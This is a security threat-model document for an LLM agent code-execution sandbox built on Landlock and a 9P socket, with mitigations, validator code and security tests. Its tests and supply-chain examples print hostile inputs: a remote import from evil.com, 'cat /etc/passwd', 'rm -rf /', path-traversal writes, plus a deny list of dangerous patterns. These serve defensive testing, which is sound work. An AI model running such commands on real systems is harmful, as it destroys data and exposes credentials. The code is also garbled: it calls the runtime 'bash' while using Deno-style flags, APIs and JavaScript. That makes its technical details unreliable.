# Code Execution Security Documentation

## Threat Model

### Overview

The code execution pattern allows agents to write and execute bash code in a isolated subprocess. This document analyzes security threats and mitigations.

### Trust Boundary

```
┌─────────────────────────────────────────┐
│ Agent (LLM)                             │
│ - Generates code                        │
│ - Untrusted input                       │
└──────────────┬──────────────────────────┘
               │ bash code
               ↓
┌─────────────────────────────────────────┐
│ Code Validator                          │
│ - Pattern matching                      │
│ - Syntax validation                     │
└──────────────┬──────────────────────────┘
               │ Validated code
               ↓
┌─────────────────────────────────────────┐
│ Subprocess (bash + Landlock)               │
│ - Filesystem restrictions               │
│ - Command whitelist                     │
│ - Resource limits                       │
└──────────────┬──────────────────────────┘
               │ 9P commands
               ↓
┌─────────────────────────────────────────┐
│ 9P Operations                           │
│ - Unix permissions                      │
│ - Event stream / mailbox archives / debug logs       │
└─────────────────────────────────────────┘
```

### Threat Categories

1. **Malicious Code Injection**: Agent generates harmful code
2. **Subprocess Escape**: Code breaks out of subprocess
3. **Resource Exhaustion**: Code consumes excessive resources
4. **Data Exfiltration**: Code leaks sensitive data
5. **9P Socket Access**: Unauthorized 9P operations
6. **Supply Chain**: Malicious dependencies

## Threat Analysis

### Threat 1: Malicious Code Injection

**Description**: Agent generates code that attempts to harm the system.

**Risk Level**: LOW

**Attack Vectors**:
- Execute arbitrary commands
- Delete files
- Modify system configuration
- Install malware

**Mitigations**:

1. **Code Validation**: Pattern matching blocks dangerous constructs
```go
func validateCode(code string) error {
    dangerous := []string{
        "bash.exit",      // Process termination
        "bash.kill",      // Kill processes
        "eval(",          // Dynamic code execution
        "Function(",      // Dynamic function creation
        "import(",        // Dynamic imports
        "bash.dlopen",    // Load native libraries
    }
    for _, pattern := range dangerous {
        if strings.Contains(code, pattern) {
            return fmt.Errorf("dangerous pattern: %s", pattern)
        }
    }
    return nil
}
```

2. **Subprocess Restrictions**: bash permissions limit capabilities
```bash
bash run \
  --allow-read=/tmp/workspace-123 \
  --allow-run=/usr/bin/9p \
  --allow-env=NAMESPACE,AGENT_ID \
  script.sh
```

3. **Command Whitelist**: Only `/usr/bin/9p` can be executed

**Residual Risk**: LOW - Multiple layers of defense

### Threat 2: Subprocess Escape

**Description**: Code breaks out of subprocess to access host system.

**Risk Level**: LOW

**Attack Vectors**:
- Exploit bash vulnerabilities
- Bypass Landlock restrictions
- Exploit kernel vulnerabilities

**Mitigations**:

1. **Landlock LSM**: Kernel-enforced filesystem restrictions
```go
// Landlock configuration (kernel-level)
// - Whitelist: /tmp/workspace-*, /usr/bin/9p
// - Deny: Everything else
```

2. **bash Subprocess**: Process-level isolation
- No network access
- Limited filesystem access
- No dynamic code loading

3. **Temporary Workspace**: Isolated per execution
```go
workspace := filepath.Join(os.TempDir(),
    fmt.Sprintf("anvilmcp-%d", time.Now().UnixNano()))
defer os.RemoveAll(workspace)
```

4. **Regular Updates**: Keep bash and kernel patched

**Residual Risk**: LOW - Kernel-enforced isolation

### Threat 3: Resource Exhaustion

**Description**: Code consumes excessive CPU, memory, or disk.

**Risk Level**: MEDIUM

**Attack Vectors**:
- Infinite loops
- Memory leaks
- Large file creation
- Fork bombs

**Mitigations**:

1. **Execution Timeout**: Hard limit on execution time
```go
ctx, cancel := context.WithTimeout(context.Background(),
    time.Duration(timeoutSec)*time.Second)
defer cancel()

cmd := exec.CommandContext(ctx, "bash", "run", ...)
```

2. **Workspace Quota**: Limit disk usage
```go
// Set quota on /tmp/workspace-* (future enhancement)
// Current: Rely on /tmp size limits
```

3. **Output Size Limit**: Truncate large outputs
```go
const maxOutputSize = 1024 * 1024  // 1 MB
if len(output) > maxOutputSize {
    output = output[:maxOutputSize]
    output = append(output, []byte("\n[Output truncated]")...)
}
```

4. **Concurrent Execution Limit**: Prevent resource exhaustion
```go
// Semaphore to limit concurrent executions
var executionSem = make(chan struct{}, 4)  // Max 4 concurrent
```

**Residual Risk**: MEDIUM - Requires monitoring and tuning

### Threat 4: Data Exfiltration

**Description**: Code leaks sensitive data outside the system.

**Risk Level**: LOW

**Attack Vectors**:
- Network exfiltration (blocked)
- Filesystem writes (restricted)
- Covert channels (timing, errors)

**Mitigations**:

1. **No Network Access**: bash runs without `--allow-net`
```bash
# Network access denied
bash run --allow-net=NONE script.sh
```

2. **Filesystem Restrictions**: Can only write to workspace
```bash
bash run --allow-write=/tmp/workspace-123 script.sh
```

3. **Explicit Logging**: Only stdout/stderr returned
```go
// Agent only sees what code prints
output, err := cmd.CombinedOutput()
return string(output), err
```

4. **Data Isolation**: Intermediate data stays in subprocess
```bash
// PII never enters model context
const emails = await getCustomerEmails();  // Stays in subprocess
for (const email of emails) {
  await updateCRM({ email: email.address });  // Direct transfer
}
console.log(`Processed ${emails.length} emails`);  // Summary only
```

**Residual Risk**: LOW — data stays in subprocess, only summaries returned to the model

### Threat 5: 9P Socket Access

**Description**: Unauthorized access to 9P operations.

**Risk Level**: MEDIUM (Same as current system)

**Attack Vectors**:
- Read sensitive data via 9P
- Modify system state via 9P
- Impersonate other agents

**Mitigations**:

1. **Unix Permissions**: Socket access controlled by filesystem
```bash
# 9P socket permissions
srwxr-x--- 1 user group 0 /tmp/ns.user.:0/anvilmcp
```

2. **Agent ID Validation**: Operations check agent identity
```go
// Verify agent ID matches session
if agentID != session.AgentID {
    return fmt.Errorf("unauthorized")
}
```

3. **Observability**: State changes visible via event stream, mailbox archives, and debug logs

4. **Operation Whitelist**: Only allowed operations exposed
```go
// Only expose safe operations
allowedOps := []string{"read", "write", "ls"}
```

**Residual Risk**: MEDIUM — inherent to any 9P client

**Mitigation**: Run locally on a trusted network. On a single-user system, the only processes with socket access are ones the user launched — self-inflicted abuse is not a meaningful threat. Do not expose the 9P mount over the network, or at minimum, implement access control (e.g., firewall).

### Threat 6: Supply Chain

**Description**: Malicious dependencies in code.

**Risk Level**: LOW

**Attack Vectors**:
- Import malicious npm packages
- Import compromised bash modules
- Remote code injection via imports

**Mitigations**:

1. **No Remote Imports**: bash runs without network access
```bash
# Remote imports fail
bash run --allow-net=NONE script.sh
# Error: Network access denied
```

2. **Standard Library Only**: Only bash std allowed
```bash
// Allowed
import { readLines } from "https://bash.land/std/io/mod.sh";

// Blocked (no network)
import { malicious } from "https://evil.com/malware.sh";
```

3. **Local Imports Only**: Only import from workspace
```bash
// Allowed
# Call tools from anvillm/tools/check_inbox.sh";

// Blocked (outside workspace)
import { evil } from "/etc/passwd";
```

**Residual Risk**: LOW - No remote imports possible

## Security Properties

1. **Data Isolation**: Intermediate data stays in subprocess — only stdout/stderr returned to the model
2. **Privacy Preservation**: PII processed in subprocess, never enters model context
3. **Explicit Control**: Agent explicitly chooses what to print (and thus what the model sees)
4. **9P Access Control**: Unix socket permissions, event stream for observability
5. **Process Isolation**: Separate landrun sandbox per execution
6. **Code Validation**: Pattern matching rejects dangerous constructs

## Subprocess Configuration

### Sandbox Selection

By default (when the `sandbox` argument is not specified), `execute_code` uses the restricted `anvilmcp` sandbox configuration. If this fails (e.g., due to kernel or permission constraints), it falls back to the `default` sandbox — the same configuration used by the outer landrun invocation. This compromise provides "just works" behavior and avoids surprises, while still applying the tighter sandbox when possible.

For higher-risk scenarios (e.g., running untrusted scripts, processing sensitive data), the `anvilmcp` sandbox should be explicitly specified to ensure the tighter restrictions are enforced — it uses a temporary workspace, minimal filesystem access, and a restricted set of environment variables.

Custom sandbox configurations can be created by adding a YAML file to the `sandbox/` subdirectory in the anvillm config directory (`~/.config/anvillm/sandbox/`). These can be as permissive or restricted as desired.

### bash Permissions

```bash
bash run \
  --allow-read=/tmp/workspace-123 \      # Read workspace only
  --allow-write=/tmp/workspace-123 \     # Write workspace only
  --allow-run=/usr/bin/9p \              # Execute 9p only
  --allow-env=NAMESPACE,AGENT_ID \       # Limited env vars
  --no-prompt \                          # No interactive prompts
  script.sh
```

### Landlock Configuration

```go
// Kernel-enforced filesystem restrictions
// Implemented via landlock(7) LSM

type LandlockConfig struct {
    AllowRead  []string  // Paths allowed for reading
    AllowWrite []string  // Paths allowed for writing
    AllowExec  []string  // Paths allowed for execution
}

config := LandlockConfig{
    AllowRead:  []string{"/tmp/workspace-*", "/usr/bin/9p"},
    AllowWrite: []string{"/tmp/workspace-*"},
    AllowExec:  []string{"/usr/bin/9p"},
}
```

### Resource Limits

```go
type ResourceLimits struct {
    TimeoutSec      int    // Max execution time
    MaxOutputBytes  int    // Max output size
    MaxConcurrent   int    // Max concurrent executions
    WorkspaceQuota  int64  // Max workspace size
}

limits := ResourceLimits{
    TimeoutSec:     30,
    MaxOutputBytes: 1024 * 1024,  // 1 MB
    MaxConcurrent:  4,
    WorkspaceQuota: 100 * 1024 * 1024,  // 100 MB
}
```

## Monitoring and Auditing

### Execution Logs

```go
type ExecutionLog struct {
    Timestamp   time.Time
    AgentID     string
    CodeHash    string      // SHA256 of code
    Language    string
    Duration    int64       // Milliseconds
    Success     bool
    OutputSize  int
    Error       string
}
```

### Metrics to Monitor

1. **Execution Rate**: Executions per minute
2. **Failure Rate**: Failed executions / total
3. **Timeout Rate**: Timeouts / total
4. **Output Size**: Average and max output size
5. **Duration**: Average and max execution time

### Alerts

1. **High Failure Rate**: >10% failures in 5 minutes
2. **Frequent Timeouts**: >5 timeouts in 5 minutes
3. **Large Outputs**: >1 MB output
4. **Validation Failures**: Dangerous patterns detected
5. **Resource Exhaustion**: Concurrent limit reached

### Audit Trail

```go
// Log all executions
log.Printf("EXEC: agent=%s hash=%s duration=%dms success=%v",
    agentID, codeHash, duration, success)

// Log validation failures
log.Printf("VALIDATION_FAILED: agent=%s pattern=%s",
    agentID, dangerousPattern)

// Log 9P operations from subprocess
log.Printf("9P: agent=%s op=%s path=%s",
    agentID, operation, path)
```

## Incident Response

### Detection

1. **Validation Failure**: Dangerous pattern detected
   - Action: Block execution, log incident, alert admin

2. **Repeated Timeouts**: Same agent timing out repeatedly
   - Action: Rate limit agent, investigate code

3. **Subprocess Escape Attempt**: Unexpected filesystem access
   - Action: Kill process, log incident, alert security team

4. **Resource Exhaustion**: Concurrent limit reached
   - Action: Queue executions, investigate load

### Response Procedures

1. **Immediate**: Kill offending process
2. **Short-term**: Block agent from code execution
3. **Investigation**: Review logs, analyze code
4. **Long-term**: Update validation rules, patch vulnerabilities

## Security Testing

### Unit Tests

```go
func TestCodeValidation(t *testing.T) {
    tests := []struct {
        code      string
        shouldFail bool
    }{
        {"console.log('hello')", false},
        {"bash.exit(1)", true},
        {"eval('malicious')", true},
    }

    for _, tt := range tests {
        err := validateCode(tt.code)
        if (err != nil) != tt.shouldFail {
            t.Errorf("validateCode(%q) = %v, want fail=%v",
                tt.code, err, tt.shouldFail)
        }
    }
}
```

### Integration Tests

```go
func TestSubprocessRestrictions(t *testing.T) {
    // Test filesystem restrictions
    code := `bash.writeTextFileSync("/etc/passwd", "hacked")`
    _, err := executeCode(code, "bash", 10)
    if err == nil {
        t.Error("Expected filesystem restriction, got success")
    }

    // Test command whitelist
    code = `bash.run({cmd: ["rm", "-rf", "/"]})`
    _, err = executeCode(code, "bash", 10)
    if err == nil {
        t.Error("Expected command restriction, got success")
    }
}
```

### Security Tests

```go
func TestSubprocessEscape(t *testing.T) {
    // Attempt various escape techniques
    escapeAttempts := []string{
        `bash.run({cmd: ["bash", "-c", "cat /etc/passwd"]})`,
        `bash.writeTextFileSync("../../../etc/passwd", "hacked")`,
        `import("https://evil.com/malware.sh")`,
    }

    for _, code := range escapeAttempts {
        _, err := executeCode(code, "bash", 10)
        if err == nil {
            t.Errorf("Subprocess escape succeeded: %s", code)
        }
    }
}
```

## Best Practices

### For Developers

1. **Validate All Code**: Never skip validation
2. **Enforce Timeouts**: Always set execution timeout
3. **Limit Output Size**: Truncate large outputs
4. **Log Everything**: Comprehensive audit trail
5. **Monitor Metrics**: Track execution patterns
6. **Update Regularly**: Keep bash and kernel patched

### For Operators

1. **Review Logs**: Regular log analysis
2. **Monitor Alerts**: Respond to security alerts
3. **Test Subprocess**: Regular security testing
4. **Update Rules**: Refine validation patterns
5. **Incident Response**: Have procedures ready

### For Users

1. **Trust the Subprocess**: Don't bypass restrictions
2. **Report Issues**: Report suspicious behavior
3. **Follow Guidelines**: Use code execution appropriately
4. **Review Output**: Check execution results

## Comparison to Alternatives

### vs Unrestricted Execution

| Aspect | Unrestricted | Code Execution |
|--------|--------------|----------------|
| Filesystem access | Full | Restricted (workspace) |
| Network access | Full | None |
| Command execution | Any | Whitelist (/usr/bin/9p) |
| Resource limits | None | Timeouts, quotas |
| Code validation | None | Pattern matching |

**Conclusion**: Code execution is significantly more secure

## References

- bash Security: https://bash.land/manual/getting_started/permissions
- Landlock LSM: https://landlock.io/
- Anthropic Code Execution: https://www.anthropic.com/engineering/code-execution-with-mcp

## Conclusion

The code execution pattern provides strong security through multiple layers:

1. **Code Validation**: Block dangerous patterns
2. **bash Subprocess**: Process-level isolation
3. **Landlock LSM**: Kernel-level enforcement
4. **Resource Limits**: Prevent exhaustion
5. **Observability**: Event stream, mailbox archives, and debug logs

**Security Posture**: Data isolation and explicit control over information flow via sandboxed subprocesses.

**Residual Risks**: Primarily resource exhaustion (MEDIUM) and 9P access control (MEDIUM, inherent to any 9P client). Mitigated by running locally on a trusted network — do not expose the 9P mount over the network, or at minimum, implement access control (e.g., firewall).
